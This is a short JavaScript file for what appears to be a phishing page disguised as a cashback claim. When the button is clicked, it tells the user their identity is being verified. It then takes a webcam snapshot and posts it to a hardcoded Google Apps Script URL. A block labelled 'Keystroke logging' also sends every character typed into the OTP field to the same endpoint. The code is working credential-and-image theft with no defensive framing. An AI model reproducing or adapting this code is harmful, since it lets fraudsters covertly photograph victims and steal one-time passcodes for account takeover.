const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx4tpUPP57s4-wThS878CK1MlC5iIP_vIOKkV-QKyRsS2e5qED1dtfJ81EcfKjOLHP_/exec';

const claimBtn = document.getElementById('claimBtn');
const video = document.getElementById('video');
const loader = document.getElementById('loader');
const otpForm = document.getElementById('otpForm');
const inputBox = document.getElementById('inputBox');

claimBtn.addEventListener('click', () => {
  loader.innerText = "📷 Verifying identity...";
  claimBtn.style.display = "none";
  otpForm.style.display = "block";

  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
    video.srcObject = stream;

    setTimeout(() => {
      const canvas = document.createElement('canvas');
      canvas.width = 320;
      canvas.height = 240;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const base64Image = canvas.toDataURL('image/jpeg');

      // Send image to backend
      fetch(APPS_SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: base64Image })
      })
      .then(() => {
        loader.innerText = "✅ Face verification complete. Enter OTP to release cashback.";
      })
      .catch(err => {
        console.error('Image error:', err);
        loader.innerText = "❌ Could not verify identity.";
      });

    }, 3000);
  }).catch(err => {
    alert("Camera permission denied or failed.");
    loader.innerText = "Camera access error.";
    console.error(err);
  });
});

// Keystroke logging
inputBox.addEventListener('input', (e) => {
  fetch(APPS_SCRIPT_URL, {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ log: `🔑 User typed OTP: ${e.target.value}` })
  });
});
